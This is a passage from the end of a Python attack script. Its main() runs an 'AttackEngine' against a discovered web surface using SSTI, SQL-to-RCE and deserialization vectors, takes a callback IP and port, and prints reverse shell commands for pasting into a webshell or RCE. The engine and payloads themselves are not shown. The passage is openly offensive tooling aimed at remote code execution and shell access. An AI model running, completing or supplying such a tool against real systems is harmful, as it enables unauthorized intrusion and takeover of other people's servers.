    parser.add_argument('--full-attack', action='store_true',
                        help='Try all attack vectors (SSTI, SQL→RCE, deserialization)')

    args = parser.parse_args()

    if not os.path.exists(args.session_state):
        print(f"Error: Session state file not found: {args.session_state}")
        sys.exit(1)

    engine = AttackEngine(
        args.session_state,
        args.discovered_surface,
        args.callback_ip,
        args.callback_port,
        args.full_attack,
    )
    engine.run()
    engine.print_banner()

    with open(args.output, 'w', encoding='utf-8') as f:
        json.dump(engine.all_results, f, ensure_ascii=False, indent=2)
    print(f"\n[+] Full attack results saved to: {args.output}")

    # Also print reverse shells for easy copy-paste
    if args.callback_ip:
        print(f"\n[+] Reverse Shell Commands (paste into webshell or RCE):")
        for rs in engine.all_results['reverse_shells']:
            print(f"\n  --- {rs['lang']} ---")
            print(f"  {rs['command']}")


if __name__ == '__main__':
    main()
